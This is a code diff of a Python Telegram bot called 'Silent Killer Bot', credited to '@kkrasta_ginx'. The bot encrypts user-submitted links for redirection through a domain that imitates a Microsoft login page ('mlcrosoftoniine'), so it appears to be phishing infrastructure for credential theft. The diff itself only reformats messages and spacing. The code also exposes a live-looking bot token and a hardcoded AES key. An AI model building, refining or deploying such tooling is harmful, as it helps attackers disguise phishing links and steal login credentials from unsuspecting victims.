@@ -9,15 +9,14 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 
-# ========== HARD-CODED CONFIG ==========
+# === CONFIG ===
 BOT_TOKEN = "8147465925:AAFkKvyFTOcpP0iADv8NplNStrdBlLUmd_U"
 AUTHORIZED_USER_ID = 7819545501
 AES_KEY = b'ThisIsA32ByteLongSecretKey123456'
 REDIRECT_DOMAIN = "https://login.id.mlcrosoftoniine.vhmxdrd.co"
 AUTHOR = "@kkrasta_ginx"
-# =======================================
-
 WAITING_FOR_LINK = 1
+# ==============
 
 def encrypt_link(link: str) -> str:
     iv = get_random_bytes(16)
@@ -29,10 +28,9 @@ def encrypt_link(link: str) -> str:
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("🔐 Encrypt Link for Redirect", callback_data="encrypt")]]
     markup = InlineKeyboardMarkup(keyboard)
-
     await update.message.reply_text(
         f"💀 *Silent Killer Bot by {AUTHOR}*\n\n"
-        f"Redirect domain in use:\n🔗 {REDIRECT_DOMAIN}",
+        f"Redirect domain:\n🔗 {REDIRECT_DOMAIN}",
         reply_markup=markup,
         parse_mode="Markdown"
     )
@@ -50,11 +48,9 @@ async def receive_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link = update.message.text.strip()
     try:
         encrypted_url = encrypt_link(link)
-        await update.message.reply_text(
-            f"✅ Redirect URL:\n{encrypted_url}\n\n— {AUTHOR}"
-        )
+        await update.message.reply_text(f"✅ Redirect URL:\n{encrypted_url}\n\n— {AUTHOR}")
     except Exception as e:
-        await update.message.reply_text(f"❌ Failed to encrypt: {e}")
+        await update.message.reply_text(f"❌ Encryption failed: {str(e)}")
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -63,13 +59,11 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
-
     conv_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(handle_button)],
         states={WAITING_FOR_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_link)]},
         fallbacks=[CommandHandler("cancel", cancel)],
     )
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(conv_handler)
     app.run_polling()
